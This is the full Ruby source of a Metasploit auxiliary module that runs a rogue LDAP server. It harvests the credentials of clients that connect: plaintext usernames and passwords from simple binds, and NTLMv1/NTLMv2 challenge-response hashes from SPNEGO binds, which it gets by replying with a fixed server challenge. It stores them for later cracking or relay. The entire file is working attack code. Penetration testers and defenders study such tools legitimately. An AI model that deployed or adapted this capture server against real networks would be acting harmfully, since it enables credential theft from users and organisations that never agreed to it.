##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/ldap'
require 'net/ldap/dn'
NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Authentication Capture: LDAP',
        'Description' => %q{
          This module mocks an LDAP service to capture authentication
          information of a client trying to authenticate against an LDAP service
        },
        'Author' => 'JustAnda7',
        'License' => MSF_LICENSE,
        'Action' => [
          [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
        ],
        'PassiveActions' => [ 'Capture' ],
        'DefaultActions' => 'Capture',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ]),
        OptString.new('CHALLENGE', [ true, 'The 8 byte challenge', Rex::Text.rand_text_alphanumeric(16) ])
      ]
    )

    deregister_options('LDIF_FILE')

    register_advanced_options(
      [
        OptString.new('Domain', [ false, 'The default domain to use for NTLM authentication', 'DOMAIN']),
        OptString.new('Server', [ false, 'The default server to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsName', [ false, 'The default DNS server name to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsDomain', [ false, 'The default DNS domain name to use for NTLM authentication', 'example.com']),
        OptBool.new('ForceDefault', [ false, 'Force the default settings', false]),
        OptPath.new('LDIF_FILE', [ false, 'Directory LDIF file path'])
      ]
    )
  end

  def run
    if datastore['CHALLENGE'].to_s =~ /^([a-zA-Z0-9]{16})$/
      @challenge = [ datastore['CHALLENGE'] ].pack('H*')
    else
      print_error('CHALLENGE syntax must match 1122334455667788') # generate a random by module
      return
    end
    exploit
  end

  def on_dispatch_request(client, data)
    return if data.strip.empty? || data.strip.nil?

    state = {}

    state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      service_name: 'ldap'
    }

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?

      res = case pdu.app_tag
            when Net::LDAP::PDU::BindRequest
              domains = []
              names = []
              result_code = nil
              user_login = pdu.bind_parameters

              if user_login.name.empty? && user_login.authentication.empty?
                state[client][:user] = user_login.name
                state[client][:pass] = user_login.authentication
                state[client][:domain] = nil
                result_code = Net::LDAP::ResultCodeSuccess
              elsif !user_login.name.empty?
                if user_login.name =~ /@/
                  pub_info = user_login.name.split('@')
                  if pub_info.length <= 2
                    state[client][:user] = pub_info[0]
                    state[client][:domain] = pub_info[1]
                  else
                    result_code = Net::LDAP::ResultCodeInvalidCredentials
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                  end
                elsif user_login.name =~ /,/
                  begin
                    dn = Net::LDAP::DN.new(user_login.name)
                    dn.each_pair do |key, value|
                      if key == 'cn'
                        names << value
                      elsif key == 'dc'
                        domains << value
                      end
                    end
                    state[client][:user] = names.first
                    state[client][:domain] = domains.empty? ? nil : domains.join('.')
                  rescue InvalidDNError => e
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                    raise e
                  end
                elsif user_login.name =~ /\\/
                  pub_info = user_login.name.split('\\')
                  if pub_info.length <= 2
                    state[client][:user] = pub_info[1]
                    state[client][:domain] = pub_info[0]
                  else
                    result_code = Net::LDAP::ResultCodeInvalidCredentials
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                  end
                else
                  state[client][:user] = user_login.name
                  state[client][:domain] = nil
                  result_code = Net::LDAP::ResultCodeInvalidCredentials
                end
                state[client][:private] = user_login.authentication
                state[client][:private_type] = :password
                unless state[client][:user].empty? && state[client][:private].empty?
                  report_cred(state[client])
                end
                result_message = "LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:pass]}"
                result_message += " Domain:#{state[client][:domain]}" if state[client][:domain]
                print_good(result_message)
              elsif user_login.authentication[0] == 'GSS-SPNEGO'
                if user_login.authentication[1] =~ /NTLMSSP/
                  message = user_login.authentication[1]

                  if message[8, 1] == "\x01"
                    domain = datastore['Domain']
                    server = datastore['Server'] # parse the domain and everythingfrom the type 1 received
                    dnsname = datastore['DnsName']
                    dnsdomain = datastore['DnsDomain']
                    dom, ws = parse_type1_domain(message)
                    if dom
                      domain = dom
                    end
                    if ws
                      server = ws
                    end
                    mess1 = Rex::Text.encode_base64(message)
                    hsh = MESSAGE.process_type1_message(mess1, @challenge, domain, server, dnsname, dnsdomain)
                    chalhash = Rex::Text.decode_base64(hsh)
                    response = encode_ldapsasl_response(
                      pdu.message_id,
                      Net::LDAP::ResultCodeSaslBindInProgress,
                      '',
                      '',
                      chalhash,
                      Net::LDAP::PDU::BindResult
                    )
                    on_send_response(client, response)
                    return
                  elsif message[8, 1] == "\x03"
                    arg = {}
                    mess2 = Rex::Text.encode_base64(message)
                    domain, user, host, lm_hash, ntlm_hash = MESSAGE.process_type3_message(mess2)
                    nt_len = ntlm_hash.length

                    if nt_len == 48 # lmv1/ntlmv1 or ntlm2_session
                      arg = {
                        ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE,
                        lm_hash: lm_hash,
                        nt_hash: ntlm_hash
                      }

                      if arg[:lm_hash][16, 32] == '0' * 32
                        arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
                      end
                    elsif nt_len > 48 # lmv2/ntlmv2
                      arg = {
                        ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE,
                        lm_hash: lm_hash[0, 32],
                        lm_cli_challenge: lm_hash[32, 16],
                        nt_hash: ntlm_hash[0, 32],
                        nt_cli_challenge: ntlm_hash[32, nt_len - 32]
                      }
                    elsif nt_len == 0
                      print_status("Empty hash from #{host} captured, ignoring ... ")
                    else
                      print_status("Unknown hash type from #{host}, ignoring ...")
                    end
                    unless arg.nil?
                      arg[:user] = user
                      arg[:domain] = domain
                      arg = arg.merge(state[client])
                      arg = process_ntlm_hash(arg)
                      report_cred(arg)
                    end
                    result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
                  end
                end
              else
                state[client][:user] = ''
                state[client][:domain] = nil
              end
              result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::BindResult
              )
            when Net::LDAP::PDU::SearchRequest
              filter = Net::LDAP::Filter.parse_ldap_filter(pdu.search_parameters[:filter])
              attrs = pdu.search_parameters[:attributes].empty? ? :all : pdu.search_parameters[:attributes]
              res = search_res(filter, pdu.message_id, attrs)
              if res.nil? || res.empty?
                result_code = Net::LDAP::ResultCodeNoSuchObject
              else
                client.write(res)
                result_code = Net::LDAP::ResultCodeSuccess
              end
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::SearchResult
              )
            when Net::LDAP::PDU::UnbindRequest
              client.close
              nil
            else
              if suitable_response(pdu.app_tag)
                result_code = Net::LDAP::ResultCodeUnwillingToPerform
                service.encode_ldap_response(
                  pdu.message_id,
                  result_code,
                  '',
                  Net::LDAP::ResultStrings[result_code],
                  suitable_response(pdu.app_tag)
                )
              else
                client.close
              end
            end

      on_send_response(client, res) unless res.nil?
    rescue StandardError => e
      client.close
      print_error("Failed to handle LDAP request due to #{e}")
    end
  end

  def process_ntlm_hash(arg = {})
    ntlm_ver = arg[:ntlm_ver]
    lm_hash = arg[:lm_hash]
    nt_hash = arg[:nt_hash]
    unless ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE || ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
      lm_cli_challenge = arg[:lm_cli_challenge]
      nt_cli_challenge = arg[:nt_cli_challenge]
    end
    domain = Rex::Text.to_ascii(arg[:domain])
    user = Rex::Text.to_ascii(arg[:user])
    host = arg[:name]

    captured_time = Time.now.to_s
    case ntlm_ver
    when NTLM_CONST::NTLM_V1_RESPONSE
      if NTLM_CRYPT.is_hash_from_empty_pwd?({
        hash: [nt_hash].pack('H*'),
        srv_challenge: @challenge,
        ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE,
        type: 'ntlm'
      })
        print_status('NLMv1 Hash correspond to an empty password, ignoring ... ')
        return
      end
      if lm_hash == nt_hash || lm_hash == '' || lm_hash =~ /^0*$/
        lm_hash_message = 'Disabled'
      elsif NTLM_CRYPT.is_hash_from_empty_pwd?({
        hash: [lm_hash].pack('H*'),
        srv_challenge: @challenge,
        ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE,
        type: 'lm'
      })
        lm_hash_message = 'Disabled (from empty password)'
      else
        lm_hash_message = lm_hash
      end

      capture_message =
        "#{captured_time}\nLDAP Login Attempt(NTLMv1 Response) => From #{host} \n" \
        "USER: #{user} \tLMHASH:#{lm_hash_message || '<NULL>'} \tNTHASH:#{nt_hash || '<NULL>'}\n"
      capture_message += " Domain:#{domain}" if domain
      hash = [
        lm_hash || '0' * 48,
        nt_hash || '0' * 48
      ].join(':').gsub(/\n/, '\\n')
      arg[:private] = hash
    when NTLM_CONST::NTLM_V2_RESPONSE
      if NTLM_CRYPT.is_hash_from_empty_pwd?({
        hash: [nt_hash].pack('H*'),
        srv_challenge: @challenge,
        cli_challenge: [nt_cli_challenge].pack('H*'),
        user: user,
        domain: domain,
        ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE,
        type: 'ntlm'
      })
        print_status('NTLMv2 Hash correspond to an empty password, ignoring ... ')
        return
      end
      if (lm_hash == '0' * 32) && (lm_cli_challenge == '0' * 16)
        lm_hash_message = 'Disabled'
      elsif NTLM_CRYPT.is_hash_from_empty_pwd?({
        hash: [lm_hash].pack('H*'),
        srv_challenge: @challenge,
        cli_challenge: [lm_cli_challenge].pack('H*'),
        user: user,
        domain: domain,
        ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE,
        type: 'lm'
      })
        lm_hash_message = 'Disabled (from empty password)'
      else
        lm_hash_message = lm_hash
      end

      capture_message =
        "#{captured_time}\nLDAP Login Attempt(NTLMv2 Response) => From #{host} \n" \
        "USER: #{user} \tLMHASH:#{lm_hash_message || '<NULL>'}\tNTHASH:#{nt_hash || '<NULL>'} "
      capture_message += " DOMAIN: #{domain}" if domain
      hash = [
        lm_hash || '0' * 32,
        nt_hash || '0' * 32
      ].join(':').gsub(/\n/, '\\n')
      arg[:private] = hash
    when NTLM_CONST::NTLM_2_SESSION_RESPONSE
      if NTLM_CRYPT.is_hash_from_empty_pwd?({
        hash: [nt_hash].pack('H*'),
        srv_challenge: @challenge,
        cli_challenge: [lm_hash].pack('H*')[0, 8],
        ntlm_ver: NTLM_CONST::NTLM_2_SESSION_RESPONSE,
        type: 'ntlm'
      })
        print_status('NTLM2_session Hash correspond to an empty password, ignoring ... ')
        return
      end

      capture_message =
        "#{captured_time}\nLDAP Login Attempt(NTLM2_SESSION Response) => From #{host} \n" \
        "USER: #{user} \tNTHASH:#{nt_hash || '<NULL>'}\n"
      capture_message += " DOMAIN: #{domain}" if domain
      hash = [
        lm_hash || '0' * 48,
        nt_hash || '0' * 48
      ].join(':').gsub(/\n/, '\\n')
      arg[:private] = hash
    else
      return
    end

    print_good(capture_message)
    arg[:domain] = domain
    arg[:user] = user
    arg[:private_type] = :ntlm_hash
    arg
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:private],
      private_type: opts[:private_type]
    }.merge(service_data)

    if opts[:domain]
      credential_data = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: opts[:domain]
      }.merge(credential_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def search_res(filter, msgid, attrflt = :all)
    if @ldif.nil? || @ldif.empty?
      attrs = []
      if attrflt.is_a?(Array)
        attrflt.each do |at|
          attrval = [Rex::Text.rand_text_alphanumeric(10)].map(&:to_ber).to_ber_set
          attrs << [at.to_ber, attrval].to_ber_sequence
        end
        dn = "dc=#{Rex::Text.rand_text_alphanumeric(10)},dc=#{Rex::Text.rand_text_alpha(4)}"
        appseq = [
          dn.to_ber,
          attrs.to_ber_sequence
        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
        [msgid.to_ber, appseq].to_ber_sequence
      end
    else
      ldif.map do |bind_dn, entry|
        next unless filter.match(entry)

        attrs = []
        entry.each do |k, v|
          if attrflt == :all || attrflt.include?(k.downcase)
            attrvals = v.map(&:to_ber).to_ber_set
            attrs << [k.to_ber, attrvals].to_ber_sequence
          end
        end
        appseq = [
          bind_dn.to_ber,
          attrs.to_ber_sequence
        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
        [msgid.to_ber, appseq].to_ber_sequence
      end.compact.join
    end
  end

  def encode_ldapsasl_response(msgid, code, dn, msg, creds, tag)
    [
      msgid.to_ber,
      [
        code.to_ber_enumerated,
        dn.to_ber,
        msg.to_ber,
        [creds.to_ber].to_ber_contextspecific(7)
      ].to_ber_appsequence(tag)
    ].to_ber_sequence
  end

  def parse_type1_domain(message)
    domain = nil
    workstation = nil

    reqflags = message[12, 4]
    reqflags = reqflags.unpack('V').first

    if (reqflags & NTLM_CONST::NEGOTIATE_DOMAIN) == NTLM_CONST::NEGOTIATE_DOMAIN
      dom_len = message[16, 2].unpack('v')[0].to_i
      dom_off = message[20, 2].unpack('v')[0].to_i
      domain = message[dom_off, dom_len].to_s
    end
    if (reqflags & NTLM_CONST::NEGOTIATE_WORKSTATION) == NTLM_CONST::NEGOTIATE_WORKSTATION
      wor_len = message[24, 2].unpack('v')[0].to_i
      wor_off = message[28, 2].unpack('v')[0].to_i
      workstation = message[wor_off, wor_len].to_s
    end
    [domain, workstation]
  end

  def suitable_response(request)
    responses = {
      Net::LDAP::PDU::BindRequest => Net::LDAP::PDU::BindResult,
      Net::LDAP::PDU::SearchRequest => Net::LDAP::PDU::SearchResult,
      Net::LDAP::PDU::ModifyRequest => Net::LDAP::PDU::ModifyResponse,
      Net::LDAP::PDU::AddRequest => Net::LDAP::PDU::AddResponse,
      Net::LDAP::PDU::DeleteRequest => Net::LDAP::PDU::DeleteResponse,
      Net::LDAP::PDU::ModifyRDNRequest => Net::LDAP::PDU::ModifyRDNResponse,
      Net::LDAP::PDU::CompareRequest => Net::LDAP::PDU::CompareResponse,
      Net::LDAP::PDU::ExtendedRequest => Net::LDAP::PDU::ExtendedResponse
    }

    responses[request]
  end
end
